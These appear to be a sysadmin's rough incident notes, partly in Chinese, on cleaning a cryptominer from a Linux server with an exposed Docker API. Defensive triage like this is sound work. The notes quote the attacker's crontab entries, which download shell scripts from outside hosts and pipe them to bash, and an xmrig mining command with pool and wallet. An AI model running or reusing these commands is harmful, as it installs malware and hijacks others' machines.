32147 root      20   0   51000   1104    204 S 132.9  0.0  23:13.58 whoami
 2690 root      20   0   51000   1312    200 S 132.2  0.0  20:02.49 cd /etc
 1949 root      20   0   51000   1224    204 S 131.6  0.0  20:55.64 ls -la

 103.25.178.154


root      1501  0.0  0.0 115440   336 ?        S    1月25   0:00 /bin/sh /usr/local/mysql/bin/mysqld_safe --datadir=/data/mysql --pid-file=/data/mysql/mysql.pid

netstat -nt | grep 172.16.0.236 | awk '{print $5}' | awk -F":" '{print $1}' | sort | uniq -c | sort -nr

27.187.40.155
27.187.40.155 5685


mysql     1515  0.1  0.2 942628 32656 ?        Ssl  2月05   4:43 ./xmrig --algo=cryptonight-lite --url=pool.aeon.hashvault.pro:3333 --user=WmthxKa4FVvSDA8fjyXiZJB3WWWFxumQJAZfRGmrMCaMCooq52sipimAYJM2NYNy34bJUX566wEBmEC2QmdmnVLh2GzgRy4F6 --pass=phantompain --donate-level=1 --max-cpu-usage=100
mysql     2513  0.1  8.8 2486028 1435868 ?     Sl   1月25  22:32 /usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=/data/mysql --plugin-dir=/usr/local/mysql/lib/plugin --user=mysql --log-error=/data/mysql/mysql-error.log --open-files-limit=65535 --pid-file=/data/mysql/mysql.pid --socket=/tmp/mysql.sock --port=3306

http://www.mamicode.com/info-detail-2416637.html



vim /var/spool/cron/root
0 0 * * * /usr/bin/wget -qO- http://d1acj5w9t09ym0.cloudfront.net/fr.sh | bash

xmrig 一直还有
mysql    31261  659  0.1 730160 26184 ?        Ssl  20:19   4:10 ./xmrig --algo=cryptonight-lite --url=pool.aeon.hashvault.pro:3333 --user=WmthxKa4FVvSDA8fjyXiZJB3WWWFxumQJAZfRGmrMCaMCooq52sipimAYJM2NYNy34bJUX566wEBmEC2QmdmnVLh2GzgRy4F6 --pass=phantompain --donate-level=1 --max-cpu-usage=100

-bash-4.2# find / -name xmrig
/var/lib/docker/overlay2/3c3b765e5e7c7f456154b180dd00603bf7f88a674b204ddbc5d5dbd962a9557f/merged/home/monero/xmrig
/var/lib/docker/overlay2/7d5eed4475b53b5cd03b160ebf35c55b433aaf0f826b408d11b98ddae04c8606/diff/home/monero/xmrig


kannix/monero-miner


## 接下来几天
* * * * * root curl "https://oceanhole.xyz/d3?n=$(nproc)" | bash || wget -qO - "https://oceanhole.xyz/d3?n=$(nproc)" | bash

* * * * * root ps aux | grep -v grep | grep kernelupd || /etc/.a/b


## 还原
docker -H tcp://172.16.0.236:2375 ps -a
https://www.cnblogs.com/hanyifeng/p/5526799.html

mqtsiiseocvibfhc



